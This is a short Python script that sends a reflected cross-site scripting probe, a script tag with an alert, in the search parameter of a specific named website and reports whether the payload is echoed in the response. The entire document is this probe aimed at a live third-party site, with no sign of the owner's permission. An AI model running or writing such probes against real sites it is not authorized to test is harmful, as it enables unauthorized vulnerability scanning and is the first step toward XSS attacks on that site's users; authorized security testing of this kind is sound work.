import requests

# The URL where the XSS test will be conducted
url = "https://www.teknofestpakistan.com/search"

# Attempt to inject a malicious script
params = {
    'q': '<script>alert("XSS Vulnerability!")</script>'
}

# Send the GET request with the XSS payload
response = requests.get(url, params=params)

# Check if the script is present in the response
if '<script>alert("XSS Vulnerability!")</script>' in response.text:
    print("XSS test passed: Vulnerability exists. Script found in the response.")
else:
    print("XSS test failed: No script injection detected.")
